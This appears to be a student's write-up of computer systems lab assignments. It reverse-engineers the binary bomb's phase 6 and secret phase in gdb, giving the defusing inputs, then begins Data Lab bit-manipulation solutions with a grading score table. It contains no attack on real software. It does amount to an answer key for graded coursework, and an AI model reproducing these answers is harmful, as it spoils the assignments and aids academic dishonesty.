    0x0000000000401138 <+68>:    mov    (%rsp,%rax,4),%eax
    0x000000000040113b <+71>:    cmp    %eax,0x0(%rbp)
    0x000000000040113e <+74>:    jne    0x401145 <phase_6+81>
    0x0000000000401140 <+76>:    callq  0x40143a <explode_bomb>
    0x0000000000401145 <+81>:    add    $0x1,%ebx
    0x0000000000401148 <+84>:    cmp    $0x5,%ebx
    0x000000000040114b <+87>:    jle    0x401135 <phase_6+65>
    0x000000000040114d <+89>:    add    $0x4,%r13
    0x0000000000401151 <+93>:    jmp    0x401114 <phase_6+32>
    0x0000000000401153 <+95>:    lea    0x18(%rsp),%rsi
    0x0000000000401158 <+100>:   mov    %r14,%rax
    0x000000000040115b <+103>:   mov    $0x7,%ecx
    0x0000000000401160 <+108>:   mov    %ecx,%edx
    0x0000000000401162 <+110>:   sub    (%rax),%edx
    0x0000000000401164 <+112>:   mov    %edx,(%rax)
    0x0000000000401166 <+114>:   add    $0x4,%rax
    0x000000000040116a <+118>:   cmp    %rsi,%rax
    0x000000000040116d <+121>:   jne    0x401160 <phase_6+108>
    0x000000000040116f <+123>:   mov    $0x0,%esi
    0x0000000000401174 <+128>:   jmp    0x401197 <phase_6+163>
    0x0000000000401176 <+130>:   mov    0x8(%rdx),%rdx
    0x000000000040117a <+134>:   add    $0x1,%eax
    0x000000000040117d <+137>:   cmp    %ecx,%eax
    0x000000000040117f <+139>:   jne    0x401176 <phase_6+130>
    0x0000000000401181 <+141>:   jmp    0x401188 <phase_6+148>
    0x0000000000401183 <+143>:   mov    $0x6032d0,%edx
    0x0000000000401188 <+148>:   mov    %rdx,0x20(%rsp,%rsi,2)
    0x000000000040118d <+153>:   add    $0x4,%rsi
    0x0000000000401191 <+157>:   cmp    $0x18,%rsi
    0x0000000000401195 <+161>:   je     0x4011ab <phase_6+183>
    0x0000000000401197 <+163>:   mov    (%rsp,%rsi,1),%ecx
    0x000000000040119a <+166>:   cmp    $0x1,%ecx
    0x000000000040119d <+169>:   jle    0x401183 <phase_6+143>
    0x000000000040119f <+171>:   mov    $0x1,%eax
    0x00000000004011a4 <+176>:   mov    $0x6032d0,%edx
    0x00000000004011a9 <+181>:   jmp    0x401176 <phase_6+130>
    0x00000000004011ab <+183>:   mov    0x20(%rsp),%rbx
    0x00000000004011b0 <+188>:   lea    0x28(%rsp),%rax
    0x00000000004011b5 <+193>:   lea    0x50(%rsp),%rsi
    0x00000000004011ba <+198>:   mov    %rbx,%rcx
    0x00000000004011bd <+201>:   mov    (%rax),%rdx
    0x00000000004011c0 <+204>:   mov    %rdx,0x8(%rcx)
    0x00000000004011c4 <+208>:   add    $0x8,%rax
    0x00000000004011c8 <+212>:   cmp    %rsi,%rax
    0x00000000004011cb <+215>:   je     0x4011d2 <phase_6+222>
    0x00000000004011cd <+217>:   mov    %rdx,%rcx
    0x00000000004011d0 <+220>:   jmp    0x4011bd <phase_6+201>
    0x00000000004011d2 <+222>:   movq   $0x0,0x8(%rdx)
    0x00000000004011da <+230>:   mov    $0x5,%ebp
    0x00000000004011df <+235>:   mov    0x8(%rbx),%rax
    0x00000000004011e3 <+239>:   mov    (%rax),%eax
    0x00000000004011e5 <+241>:   cmp    %eax,(%rbx)
    0x00000000004011e7 <+243>:   jge    0x4011ee <phase_6+250>
    0x00000000004011e9 <+245>:   callq  0x40143a <explode_bomb>
    0x00000000004011ee <+250>:   mov    0x8(%rbx),%rbx
    0x00000000004011f2 <+254>:   sub    $0x1,%ebp
    0x00000000004011f5 <+257>:   jne    0x4011df <phase_6+235>
    0x00000000004011f7 <+259>:   add    $0x50,%rsp
    0x00000000004011fb <+263>:   pop    %rbx
    0x00000000004011fc <+264>:   pop    %rbp
    0x00000000004011fd <+265>:   pop    %r12
    0x00000000004011ff <+267>:   pop    %r13
    0x0000000000401201 <+269>:   pop    %r14
    0x0000000000401203 <+271>:   retq    
```

Early in the phase, read_six_numbers is called, so from phase_2:

- we know our input format is "%d %d %d %d %d %d"
- our input values will be stored in the stack (%rsp)
    
Running phase again with input "0 1 2 3 4 5" and setting a breakpoint at phase_6 + 23 to exit the read six numbers

```
=> 0x40110b <phase_6+23>:       mov    %rsp,%r14 --> the address to our input values is moved into %r14
=> 0x40110e <phase_6+26>:       mov    $0x0,%r12d --> lower 32bits of r12 are set to 0
=> 0x401114 <phase_6+32>:       mov    %r13,%rbp --> r13 holds the address to our input values as well
                                                 --> address to our input values is moved into %rbp
=> 0x401117 <phase_6+35>:       mov    0x0(%r13),%eax --> our first value is moved into %eax
=> 0x40111b <phase_6+39>:       sub    $0x1,%eax --> 1 is subtracted from %eax (now holds -1 = 0 - 1)
=> 0x40111e <phase_6+42>:       cmp    $0x5,%eax --> 5 is compared to %eax (-1)
=> 0x401121 <phase_6+45>:       jbe    0x401128 <phase_6+52>
```

-1 is < than 5, but jbe will fail in this case since the operands are treated as unsigned in cmp. [bibliography reference 2]

Killing program and running again with "1 2 3 4 5 6".

RULE: 0 <= first input <= 6

Successfully jumped over the bomb call.

```
=> 0x401128 <phase_6+52>:       add    $0x1,%r12d --> 1 is added to %r12d, so r12d = 0 + 1 = 1
=> 0x40112c <phase_6+56>:       cmp    $0x6,%r12d --> comparing 6 and 1
=> 0x401130 <phase_6+60>:       je     0x401153 <phase_6+95> -->not going to jump
```

It doesn't look like r12 is affected by our input so far so not going to change input

Continuing through the phase:

```
=> 0x401132 <phase_6+62>:       mov    %r12d,%ebx --> 1 is moved into %ebx
=> 0x401135 <phase_6+65>:       movslq %ebx,%rax --> 1 is moved into %rax (movslq) preseves the sign when moving from 32 to 64 bit. [bibliography reference 3]
=> 0x401138 <phase_6+68>:       mov    (%rsp,%rax,4),%eax --> since %rax is one, (%rsp + 4) is move into %eax
                                                          --> this is our second value (2) being moved into %eax
=> 0x40113b <phase_6+71>:       cmp    %eax,0x0(%rbp) --> comparing our second input to what's stored at (%rbp):

(gdb) x /d $rbp
0x7fffffffe190: 1 --> this is our first input value

=> 0x40113e <phase_6+74>:       jne    0x401145 <phase_6+81> -->we're jumping over the bomb because our first 2 inputs aren't equal
```

RULE: first 2 inputs have to be different

```
=> 0x401145 <phase_6+81>:       add    $0x1,%ebx --> adding 1 to %ebx; %ebx = 1 + 1 = 2
=> 0x401148 <phase_6+84>:       cmp    $0x5,%ebx --> comparing %ebx and 5 (2 and 5)
=> 0x40114b <phase_6+87>:       jle    0x401135 <phase_6+65> -->we're jumping back to +65 is ebx <= 5
```

We will then compare our 3rd input (because %ebx was incremented) and explode if it's equal to the first.

We'll get out of the loop when we've compared all our inputs to the first one.

RULE: all inputs have to be different from the first input.

I think the C code for this loop is something like this:

```
for(int i = 1; i <= 5; i++){
    if(input[i] == input[0]){
        explode_bomb();
    }
}
```

Adding the breakpoint at +89 and continuing so we finish the loop.

```
=> 0x40114d <phase_6+89>:       add    $0x4,%r13 --> 4 is added to %r13, so the address at r13 now points to our second input value
=> 0x401151 <phase_6+93>:       jmp    0x401114 <phase_6+32> --> jumping back to +32
```

Reading through the code, it looks like we have a nested loop betwwen 32 and 93, which will ensure that all values are different.

In this block of instructions, we will jump to the bomb if any value is greater than 6 or less than 1 and if any value is equal to another value.

Something like

```
for int(i = 0; i <= 5; i++){

    if((input[i] - 1) > 5){
        explode_bomb();
    }

    for(int j = 1; j <= 5; j++){
        if(input[i] == input(j)){
            explode_bomb();
        }
    }
}
```

If I'm correct, our input of "1 2 3 4 5 6" should get us past the nested loops and jump to +95.

Setting a breakpoint at +95 and continuing.

We successfully exited the nested loops:

```
=> 0x401153 <phase_6+95>:       lea    0x18(%rsp),%rsi
```

Note: I'm thinking that "1 2 3 4 5 6" might be the only possible input that will get through the nested loop, so I'm going to try to see if this input might defuse the phase.
    
The breakpoint at explode_bomb tirggered, so "1 2 3 4 5 6" is not the correct input. Perhaps their order can be altered?

Still keeping the "1 2 3 4 5 6" input and continuing from +95

```
=> 0x401153 <phase_6+95>:       lea    0x18(%rsp),%rsi --> this is a value after our last input value
=> 0x401158 <phase_6+100>:      mov    %r14,%rax --> pointer to our first value moved into %rax
=> 0x40115b <phase_6+103>:      mov    $0x7,%ecx --> 7 moved into %rcx
=> 0x401160 <phase_6+108>:      mov    %ecx,%edx --> 7 moved into %edx
=> 0x401162 <phase_6+110>:      sub    (%rax),%edx --> %edx = 7 - input[0] = 7 - 1 = 6
=> 0x401164 <phase_6+112>:      mov    %edx,(%rax) --> input[0] = 6
=> 0x401166 <phase_6+114>:      add    $0x4,%rax --> %rax now points to input[1]
=> 0x40116a <phase_6+118>:      cmp    %rsi,%rax --> %rsi (0) is compared to input[1] (2)
=> 0x40116d <phase_6+121>:      jne    0x401160 <phase_6+108> --> we're jumping back since they're not equal
```

Looks like this loop will flip the order of our input. It does something like

```
int i = 0;
while(input[i] != 0){
    input[i] = 7 - input[i];
    i++;
}
```

input[6] should be undefined, but we've examined it to be 0, so the loop should terminate once all the values are processed.

our input array will then be 6, 5, 4, 3, 2, 1

Setting a breakpoint at +123 and continuing to check if we exit the loop:

We successfully exited the loop.

```
=> 0x40116f <phase_6+123>:      mov    $0x0,%esi -->%esi set to 0
=> 0x401174 <phase_6+128>:      jmp    0x401197 <phase_6+163>
=> 0x401197 <phase_6+163>:      mov    (%rsp,%rsi,1),%ecx --> pointer to our first value put into %ecx
=> 0x40119a <phase_6+166>:      cmp    $0x1,%ecx --> %ecx holds 6.
=> 0x40119d <phase_6+169>:      jle    0x401183 <phase_6+143> --> if 6 <= 1, we will jump to +143, otherwise we continue
```             

Looks like both +143 and +176 execute the same instruction
    
The difference is that if we don't jump to +143, eax will be set to 1.

Both +143 and +176 load something from memory, so let's see what's there:

```
(gdb) x /d 0x6032d0
0x6032d0 <node1>:       76 --> could node1 be a struct?
```

REMINDER: if I want to jump here, input[0] has to be 1, but it has been flipped, so the first value of original input should be 6.

continuing:

```
=> 0x40119f <phase_6+171>:      mov    $0x1,%eax
=> 0x4011a4 <phase_6+176>:      mov    $0x6032d0,%edx
=> 0x4011a9 <phase_6+181>:      jmp    0x401176 <phase_6+130> --> jumping to +130
```

```
=> 0x401176 <phase_6+130>:      mov    0x8(%rdx),%rdx --> %rdx now points to 0x6032e0 <node2>:       -88
=> 0x40117a <phase_6+134>:      add    $0x1,%eax --> %eax is now 2
=> 0x40117d <phase_6+137>:      cmp    %ecx,%eax --> %ecx still holds our first value (6)
=> 0x40117f <phase_6+139>:      jne    0x401176 <phase_6+130>
```

It looks like we will itterate through 5 times and move the pointer down the list of nodes:

```
0x6032d0 <node1>:       76
0x6032e0 <node2>:       -88
0x6032f0 <node3>:       -100
0x603300 <node4>:       -77
0x603310 <node5>:       -35
0x603320 <node6>:       -69
There doesn't appear to be a node7
```

Setting a breakpoint at +141 and continuing out of the loop

```
=> 0x401181 <phase_6+141>:      jmp    0x401188 <phase_6+148>
=> 0x401188 <phase_6+148>:      mov    %rdx,0x20(%rsp,%rsi,2)
```

%rdx now holds a pointer to node6

%rsp + 0x20 is the third value after our last input value

```
=> 0x40118d <phase_6+153>:      add    $0x4,%rsi --> rsi incremented by 0x4
=> 0x401191 <phase_6+157>:      cmp    $0x18,%rsi
=> 0x401195 <phase_6+161>:      je     0x4011ab <phase_6+183>
=> 0x401197 <phase_6+163>:      mov    (%rsp,%rsi,1),%ecx --> %ecx = (%rsp + 4) = input[1] = 5
=> 0x40119a <phase_6+166>:      cmp    $0x1,%ecx
=> 0x40119d <phase_6+169>:      jle    0x401183 <phase_6+143> --> these are not equal so we're continuing
```

```
=> 0x40119f <phase_6+171>:      mov    $0x1,%eax --> %eax = 1
=> 0x4011a4 <phase_6+176>:      mov    $0x6032d0,%edx --> node1 is put into rdx and it used to hold node6
=> 0x4011a9 <phase_6+181>:      jmp    0x401176 <phase_6+130>
```

Looks like we're jumping back to the loop in +130, but ecx now holds our second value (5) and the last time it held (6) so we're moving through

We kept iterating until %eax reached 5 

At the end of the loop node5 is stored in %rax

```
=> 0x401181 <phase_6+141>:      jmp    0x401188 <phase_6+148>
=> 0x401188 <phase_6+148>:      mov    %rdx,0x20(%rsp,%rsi,2)
```

Looks like node5 is being put into the input array after node6.

Going to run through until they're all done
    
Exited the loop and landed at +183

```
=> 0x4011ab <phase_6+183>:      mov    0x20(%rsp),%rbx
```

Let's see what our input array looks like now:

```
(gdb) x /d $rsp
0x7fffffffe190: 6           --> input[0]
(gdb) x /d $rsp + 0x4
0x7fffffffe194: 5           --> input[1]
(gdb) x /d $rsp + 0x8
0x7fffffffe198: 4           --> input[2]
(gdb) x /d $rsp + 0xc
0x7fffffffe19c: 3           --> input[3]
(gdb) x /d $rsp + 0x10
0x7fffffffe1a0: 2           --> input[4]
(gdb) x /d $rsp + 0x14
0x7fffffffe1a4: 1           --> input[5]
(gdb) x /d $rsp + 0x18
0x7fffffffe1a8: 0           --> input[6]
(gdb) x /d $rsp + 0x1c
0x7fffffffe1ac: 0           --> input[7]
(gdb) x /d $rsp + 0x20
0x7fffffffe1b0: 6304544     --> input[8]    --> pointer to node6
(gdb) x /d $rsp + 0x24
0x7fffffffe1b4: 0
(gdb) x /d $rsp + 0x28
0x7fffffffe1b8: 6304528     --> input[10]   --> pointer to node5
(gdb) x /d $rsp + 0x2c
0x7fffffffe1bc: 0
(gdb) x /d $rsp + 0x30
0x7fffffffe1c0: 6304512     --> input[12]   --> pointer to node4
(gdb) x /d $rsp + 0x38
0x7fffffffe1c8: 6304496     --> input[14]   --> pointer to node3
(gdb) x /d $rsp + 0x40
0x7fffffffe1d0: 6304480     --> input[16]   --> pointer to node2
(gdb) x /d $rsp + 0x48
0x7fffffffe1d8: 6304464     --> input[18]   --> pointer to node1
```

```
=> 0x4011ab <phase_6+183>:      mov    0x20(%rsp),%rbx --> pointer to node6 is put into %rbx
=> 0x4011b0 <phase_6+188>:      lea    0x28(%rsp),%rax --> pointer to node5 is put into %rax
=> 0x4011b5 <phase_6+193>:      lea    0x50(%rsp),%rsi --> pointer to nothing (past node 1) put into $rsi
=> 0x4011ba <phase_6+198>:      mov    %rbx,%rcx --> node6 put into %rcx
=> 0x4011bd <phase_6+201>:      mov    (%rax),%rdx --> node5 put into %rdx
=> 0x4011c0 <phase_6+204>:      mov    %rdx,0x8(%rcx) --> node5 put after %rcx
=> 0x4011c4 <phase_6+208>:      add    $0x8,%rax --> %rax now holds a pointer to node4
=> 0x4011c8 <phase_6+212>:      cmp    %rsi,%rax --> %rsi holds pointer to nothing, %rax pointer to node4
=> 0x4011cb <phase_6+215>:      je     0x4011d2 <phase_6+222> --> this jump won't happen
=> 0x4011cd <phase_6+217>:      mov    %rdx,%rcx --> %rcx will now hold a pointer to node5, it used to hold a pointer to node6
=> 0x4011d0 <phase_6+220>:      jmp    0x4011bd <phase_6+201> --> jumping back to 201
```

It looks like this loop will run until we've put all the nodes into %rcx from node6 down. 

This means %rax will eventually hold a pointer to nothing that's the same as %rsi and we will exit the loop.

Putting a breakpoint on +222 and continuing to exit the loop.

Successfully exited the function. Looks like rdx was changed every time in this loop:
```
rdx --> pointer to node1
rdx + 0x8 --> pointer to node2
rdx + 0x10 --> pointer to node3 ...
```

```
=> 0x4011d2 <phase_6+222>:      movq   $0x0,0x8(%rdx) --> pointer to node2 set to 0x0
=> 0x4011da <phase_6+230>:      mov    $0x5,%ebp --> moving 5 into %ebp
=> 0x4011df <phase_6+235>:      mov    0x8(%rbx),%rax --> pointer to node5 moved into %rax
=> 0x4011e3 <phase_6+239>:      mov    (%rax),%eax --> stripping it to 32 bits
=> 0x4011e5 <phase_6+241>:      cmp    %eax,(%rbx) --> pointer to node5 compared to node6
=> 0x4011e7 <phase_6+243>:      jge    0x4011ee <phase_6+250> 
```

If pointer to node6 is greater than pointer to node5 we will jump over the node.

It is not, since node6 is earlier in memory than node5 than.

Looking back at the execution, it looks like that on line +169, if we do manage to jump to 143, the nodes will be inserted in a different order.

According to my own reminder up there, the first input needs to be 6 to make that jump

Killing the program and trying "6 5 4 3 2 1"
this didn't work, looks like that in this case:

%rbx holds a pointer to node1, but %rax holds 0xa8

So looks like we don't want to jump to +143, so we don't want 6 in the first place,

But the order of our inputs does determine in which order the nodes are placed, so we want the first input to be larger than the 2nd one

Trying "2 1 3 4 5 6"

This got us over the bomb at +243, but we looped back to +235 at +257

The pointer to the node in %rax is then moved to the next node, so the comparison will fail.

This means we want the numbers decreasing, but we don't want 6 in the first place.

Trying "5 4 3 2 1 6"

This did not work.

It looks like %ebp decreases every time we successfully jump over the bomb call.

It needs to successfully decrease 5 times for us to defuse the phase.

The nodes are compared in pairs, so we have to order them from biggest value to lowest value.

Let's look at the values the nodes hold (sorted):

```
3: 924
4: 691
5: 477
6: 443
1: 332
2: 168
```

This might solve the bomb. Trying "3 4 5 6 1 2"

Didn't work.

Our input values are flipped earlier in the code with every value being 7 - value.

Let's try inverting this in the same way.

Trying "4 3 2 1 6 5"

That solves phase_6.


## Secret Phase

Looks like secret_phase is only called from phase_defused so let's start there:

Disassemble of phase_defused:

```
    (gdb) disassemble phase_defused
    Dump of assembler code for function phase_defused:
 => 0x00000000004015c4 <+0>:     sub    $0x78,%rsp
    0x00000000004015c8 <+4>:     mov    %fs:0x28,%rax
    0x00000000004015d1 <+13>:    mov    %rax,0x68(%rsp)
    0x00000000004015d6 <+18>:    xor    %eax,%eax
    0x00000000004015d8 <+20>:    cmpl   $0x6,0x202181(%rip)        # 0x603760 <num_input_strings>
    0x00000000004015df <+27>:    jne    0x40163f <phase_defused+123>
    0x00000000004015e1 <+29>:    lea    0x10(%rsp),%r8
    0x00000000004015e6 <+34>:    lea    0xc(%rsp),%rcx
    0x00000000004015eb <+39>:    lea    0x8(%rsp),%rdx
    0x00000000004015f0 <+44>:    mov    $0x402619,%esi
    0x00000000004015f5 <+49>:    mov    $0x603870,%edi
    0x00000000004015fa <+54>:    callq  0x400bf0 <__isoc99_sscanf@plt>
    0x00000000004015ff <+59>:    cmp    $0x3,%eax
    0x0000000000401602 <+62>:    jne    0x401635 <phase_defused+113>
    0x0000000000401604 <+64>:    mov    $0x402622,%esi
    0x0000000000401609 <+69>:    lea    0x10(%rsp),%rdi
    0x000000000040160e <+74>:    callq  0x401338 <strings_not_equal>
    0x0000000000401613 <+79>:    test   %eax,%eax
    0x0000000000401615 <+81>:    jne    0x401635 <phase_defused+113>
    0x0000000000401617 <+83>:    mov    $0x4024f8,%edi
    0x000000000040161c <+88>:    callq  0x400b10 <puts@plt>
    0x0000000000401621 <+93>:    mov    $0x402520,%edi
    0x0000000000401626 <+98>:    callq  0x400b10 <puts@plt>
    0x000000000040162b <+103>:   mov    $0x0,%eax
    0x0000000000401630 <+108>:   callq  0x401242 <secret_phase>
    0x0000000000401635 <+113>:   mov    $0x402558,%edi
    0x000000000040163a <+118>:   callq  0x400b10 <puts@plt>
    0x000000000040163f <+123>:   mov    0x68(%rsp),%rax
    0x0000000000401644 <+128>:   xor    %fs:0x28,%rax
    0x000000000040164d <+137>:   je     0x401654 <phase_defused+144>
    0x000000000040164f <+139>:   callq  0x400b30 <__stack_chk_fail@plt>
    0x0000000000401654 <+144>:   add    $0x78,%rsp
    0x0000000000401658 <+148>:   retq
```

Disassemble of secret_phase:

```
    (gdb) disassemble secret_phase
    Dump of assembler code for function secret_phase:
    0x0000000000401242 <+0>:     push   %rbx
    0x0000000000401243 <+1>:     callq  0x40149e <read_line>
    0x0000000000401248 <+6>:     mov    $0xa,%edx
    0x000000000040124d <+11>:    mov    $0x0,%esi
    0x0000000000401252 <+16>:    mov    %rax,%rdi
    0x0000000000401255 <+19>:    callq  0x400bd0 <strtol@plt>
    0x000000000040125a <+24>:    mov    %rax,%rbx
    0x000000000040125d <+27>:    lea    -0x1(%rax),%eax
    0x0000000000401260 <+30>:    cmp    $0x3e8,%eax
    0x0000000000401265 <+35>:    jbe    0x40126c <secret_phase+42>
    0x0000000000401267 <+37>:    callq  0x40143a <explode_bomb>
    0x000000000040126c <+42>:    mov    %ebx,%esi
    0x000000000040126e <+44>:    mov    $0x6030f0,%edi
    0x0000000000401273 <+49>:    callq  0x401204 <fun7>
    0x0000000000401278 <+54>:    cmp    $0x2,%eax
    0x000000000040127b <+57>:    je     0x401282 <secret_phase+64>
    0x000000000040127d <+59>:    callq  0x40143a <explode_bomb>
    0x0000000000401282 <+64>:    mov    $0x402438,%edi
    0x0000000000401287 <+69>:    callq  0x400b10 <puts@plt>
    0x000000000040128c <+74>:    callq  0x4015c4 <phase_defused>
    0x0000000000401291 <+79>:    pop    %rbx
    0x0000000000401292 <+80>:    retq
```

So with all our solutions for the bomb, on line:

```
=> 0x4015df <phase_defused+27>: jne    0x40163f <phase_defused+123>
```

We jump over to +123, and never have a chance of reaching the secret phase.

Because of the comment on previous line #num_input_strings, looks like if we have 6 input strings we will hit this jump.

Let's try adding a 7th string on bottom of the solutions.

On the 6th phase, we manage to skip the jump.

```
=> 0x4015e1 <phase_defused+29>: lea    0x10(%rsp),%r8 --> pointer to 0x1 is moved into r8
=> 0x4015e6 <phase_defused+34>: lea    0xc(%rsp),%rcx --> pointer to 0x6 is moved into %rcx
=> 0x4015eb <phase_defused+39>: lea    0x8(%rsp),%rdx --> pointer to 0x5 is moved into %rdx
```

These are our input values from phase_6.

```
=> 0x4015f0 <phase_defused+44>: mov    $0x402619,%esi

(gdb) x /s 0x402619
0x402619:       "%d %d %s" --> input format

=> 0x4015f5 <phase_defused+49>: mov    $0x603870,%edi

(gdb) x /s 0x603870
0x603870 <input_strings+240>:   "7 0" --> our solution for phase 4

=> 0x4015fa <phase_defused+54>: callq  0x400bf0 <__isoc99_sscanf@plt>
```

Setting a breakpoint at +59 after we return from sscanf
```
=> 0x4015ff <phase_defused+59>: cmp    $0x3,%eax --> %eax holds 2
=> 0x401602 <phase_defused+62>: jne    0x401635 <phase_defused+113> --> we don't want to make this jump, since it would skip overt he secret phase
```

From previous sscanf calls, I think %eax might hold number of inputs in a line.

Trying again with "0 1 string" as last input in the solution file

%rax still holds 2, so I was wrong.

Since we are loading our solution for phase_4 "7 0" into edi before sscanf is called,

I'll try adding a string to the end of that solution, because it almost fits the format specified earlier of %d %d %s. 

Changing solution for 4 to "7 0 string"

That worked! %rdx is now 3

```
=> 0x401602 <phase_defused+62>: jne    0x401635 <phase_defused+113> --> not jumping this time
=> 0x401604 <phase_defused+64>: mov    $0x402622,%esi --> "DrEvil" moved into esi

(gdb) x /s 0x402622
0x402622:       "DrEvil"

=> 0x401609 <phase_defused+69>: lea    0x10(%rsp),%rdi --> "string" moved into rdi
=> 0x40160e <phase_defused+74>: callq  0x401338 <strings_not_equal> --> jumping over this
=> 0x401613 <phase_defused+79>: test   %eax,%eax
```

We're not going to pass this check. Our input for phase_4 should be "7 0 DrEvil"

Continuing with changed input:

```
=> 0x401613 <phase_defused+79>: test   %eax,%eax --> %rax now holds 0
=> 0x401615 <phase_defused+81>: jne    0x401635 <phase_defused+113> --> not jumping because %eax is 0
=> 0x401617 <phase_defused+83>: mov    $0x4024f8,%edi

(gdb) x /s 0x4024f8
0x4024f8:       "Curses, you've found the secret phase!" --> yay

=> 0x40161c <phase_defused+88>: callq  0x400b10 <puts@plt> --> continuing through this
=> 0x401621 <phase_defused+93>: mov    $0x402520,%edi

(gdb) x /s 0x402520
0x402520:       "But finding it and solving it are quite different..."
```

Are these just here for me to read?

```
=> 0x401626 <phase_defused+98>: callq  0x400b10 <puts@plt> --> continuing through this
=> 0x40162b <phase_defused+103>:        mov    $0x0,%eax --> %eax set to 0
=> 0x401630 <phase_defused+108>:        callq  0x401242 <secret_phase> --> I'm in

=> 0x401242 <secret_phase>:     push   %rbx --> %rbx pushed to stack
=> 0x401243 <secret_phase+1>:   callq  0x40149e <read_line> --> continuing through this
=> 0x401248 <secret_phase+6>:   mov    $0xa,%edx --> edx set to 10
```

Checking the differences after we came out of read_line:

- %rax holds a pointer to our 7th input "0 1 string"
- rcx holds 10
- rdx holds 7 --> our first input for phase_4?
- rsi = rax
- rdi holds a pointer to memory past the end of our 7th input

```
=> 0x40124d <secret_phase+11>:  mov    $0x0,%esi --> %esi set to 0
=> 0x401252 <secret_phase+16>:  mov    %rax,%rdi --> pointer to our 7th input moved to %rdi
=> 0x401255 <secret_phase+19>:  callq  0x400bd0 <strtol@plt> --> call to strtol, jumping over this [bibliography reference 4]
```

Checking the differences after strtol:

```
(gdb) i r
rax            0x0      0
rbx            0x7fffffffe2f8   140737488347896
rcx            0x1999999999999999       1844674407370955161
rdx            0x0      0
rsi            0xfffffff0       4294967280
rdi            0x20     32
rbp            0x402210 0x402210 <__libc_csu_init>
```

```
=> 0x40125a <secret_phase+24>:  mov    %rax,%rbx --> 0 moved to %rbx
=> 0x40125d <secret_phase+27>:  lea    -0x1(%rax),%eax --> -1 moved into %eax
=> 0x401260 <secret_phase+30>:  cmp    $0x3e8,%eax
=> 0x401265 <secret_phase+35>:  jbe    0x40126c <secret_phase+42>
```

%eax has to be <= 0x3e8 for us to jump over the bomb. This will fail since this is unsigned comparison and 0xfff... > 0x3e8

We will need a 7th input that will pass this check.

Changing the 7th input to "1 2 string":

This time we pass the check since rax holds 0 (1 - 1) at the time of comparison (+30)

Jumped over the bomb call.

```
=> 0x40126c <secret_phase+42>:  mov    %ebx,%esi --> moving the 
=> 0x40126e <secret_phase+44>:  mov    $0x6030f0,%edi
```

```
(gdb) x /s 0x6030f0
0x6030f0 <n1>:  "$"
(gdb) x /x 0x6030f0
0x6030f0 <n1>:  0x24
```

```
=> 0x401273 <secret_phase+49>:  callq  0x401204 <fun7> --> call to fun7
=> 0x401204 <fun7>:     sub    $0x8,%rsp --> stack alignment
=> 0x401208 <fun7+4>:   test   %rdi,%rdi
=> 0x40120b <fun7+7>:   je     0x401238 <fun7+52>
```

This jump to the end of fun7 will only happen when rdi holds 0x0, but rdi holds 0x6030f0 now.

```
=> 0x40120d <fun7+9>:   mov    (%rdi),%edx --> moving the value at 0x6030f0 (0x24) into edx
=> 0x40120f <fun7+11>:  cmp    %esi,%edx --> rsi holds 0x1, edx holds 0x24
=> 0x401211 <fun7+13>:  jle    0x401220 <fun7+28> --> this jump won't happen
=> 0x401213 <fun7+15>:  mov    0x8(%rdi),%rdi --> moving 0x10 into rdi

(gdb) x /x 0x6030f8
0x6030f8 <n1+8>:        0x10

=> 0x401217 <fun7+19>:  callq  0x401204 <fun7> --> recursive call of fun7
```

Looking at the next line after the call to the fun7 in secret phase:

```
        0x0000000000401278 <+54>:    cmp    $0x2,%eax
```

It looks like the return of fun7 needs to be 2 for us to skip over the bomb call and solve the secret phase.

It seems that only the first value of our input 7 is used in fun7 and it's compared as an integer.

I got stuck for a while trying to follow through the recursive function.

Following the suggestion from Jim's notes and attempting to bruteforce a solution assuming an integer input: [bibliography reference 5]

It looks like 20 is also a solution besides 22:

```
(gdb) print (int) fun7(6303984, 20)
$22 = 2
```

changing input line 7 to "20".
That solves the secret_phase.

[Back to Top](./labs#highlighted-labs-for-computer-systems)

# Data Lab
Output of ./driver.pl:
```
Correctness Results     Perf Results
Points  Rating  Errors  Points  Ops     Puzzle
1       1       0       2       7       bitXor
1       1       0       2       1       tmin
1       1       0       2       6       isTmax
2       2       0       2       2       negate
2       2       0       2       4       sign
2       2       0       2       5       getByte
3       3       0       2       10      isAsciiDigit
3       3       0       2       7       conditional
3       3       0       2       6       replaceByte
4       4       0       2       6       logicalNeg
4       4       0       2       11      bitParity
4       4       0       2       27      floatInt2Float
4       4       0       2       19      floatFloat2Int

Score = 60/60 [34/34 Corr + 26/26 Perf] (111 total operators)
```

## bitXor
x^y using only ~ and &
### Rules
- Example: bitXor(4, 5) => 1
- Legal Ops: ~, &
- Max ops: 14
- Rating: 1
### Discussion
Bitwise XOR essentially means "get all bits that are different" in 2 words.

Based on this, my approach is to somehow locate all bits that are 1 in both words, and then all the bits that are 0 in both words. 

These bits can then be excluded (set to 0) and all other ones set to 1.

locate_ones_in_both will have a 1 in every place where both x and y have a 1.

locate_zeros_in_both does the same thing, but we flip the bits beforehand, so that all bits where both x and y have 0 will be 1.

We now need to get all the bits where both of these new variables have 0, since those are the only bits in x and y that are different.

We use the same trick as with locate_zeros_in_both and return the output.
### Solution
```
int bitXor(int x, int y) {
    int locate_ones_in_both = x & y;
    int locate_zeros_in_both = ~x & ~y;

    return ~locate_ones_in_both & ~locate_zeros_in_both;
}
```
## tmin
return minimum two's complement integer
### Rules
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 4
- Rating: 1
### Discussion
Because of the way two's complement works, the alrgest negative integer will always be a value of 1, followed by all 0s. 

We can achieve this easily by using a literal 0x1 and shifting the bits to the left, until the 1 is in the leftmost place.

We're assuming 32-bit integers so we should shift by 31.
### Solution
```
int tmin(void) {
    return 0x1 << 31;
}
```
## isTmax
returns 1 if x is the maximum, two's complement number, and 0 otherwise
### Rules
- Legal ops: !, ~, &, ^, |, +
- Max ops: 10
- Rating: 1
### Discussion
The maximum value integer is 0x7fffffff

Because of the property a ^ a = 0, we basically want to return !(x ^ Tmax). If x == Tmax, we would be returning !0 = 1.

Because of the way Two's complement works: 
- Tmin = Tmax + 0x1.
- Tmin + Tmax = -1.
Therefore Tmax + Tmax = -2; 

Tmax + Tmax + 2 = 0.

So the solution would be returning !(x + x + 2), but the problem with this is that it also triggeres for x = -1, because of the overflow.

We can explicitly exclude -1 using !!(x + 1), which will return 1 in all cases except for x = -1.

Therefore the solution here is !(x + x + !!(x + 1) + 1). 

Notice that this is equivalent to !(x + (x + 1) + !!(x + 1)).

This allows us to improve the solution slightly and use only 6 instead of 7 operators, by calculating (x + 1) earlier and then using it in 2 places.
### Solution
```
int isTmax(int x) {
    int x_plus_one = x + 1;

    return !(x + !!x_plus_one + x_plus_one);
}
```
## negate
return -x
### Rules
- Example: negate(1) => -1
